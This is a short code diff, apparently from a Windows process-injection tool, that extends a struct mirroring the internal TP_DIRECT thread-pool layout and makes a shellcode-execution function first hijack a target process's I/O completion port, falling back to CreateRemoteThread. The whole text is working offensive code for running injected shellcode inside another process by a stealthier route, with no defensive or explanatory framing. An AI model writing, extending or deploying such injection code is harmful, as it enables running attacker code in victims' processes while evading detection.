@@ -50,8 +50,13 @@ HANDLE FindIoCompletion(HANDLE process) {
 }
 
 struct TpDirect {
+    ULONG_PTR Task[4]; // placeholder for TP_TASK (we don't need to fill it)
+    UINT64 Lock;
     LIST_ENTRY Io;
     void* Callback;
+    UINT32 Numa;
+    UINT8 Ideal;
+    char Pad[3];
 };
 
 bool RunViaIoCompletion(HANDLE process, PVOID remoteSc) {
@@ -141,5 +146,8 @@ bool injector::TpExecuteShellcodeSync(HANDLE process, const void* shellcode, siz
         VirtualFreeEx(process, remoteSc, 0, MEM_RELEASE);
         return false;
     }
+    if (RunViaIoCompletion(process, remoteSc))
+        return true;
+    printf("[*] Falling back to CreateRemoteThread for shellcode\n");
     return RunViaRemoteThread(process, remoteSc);
 }
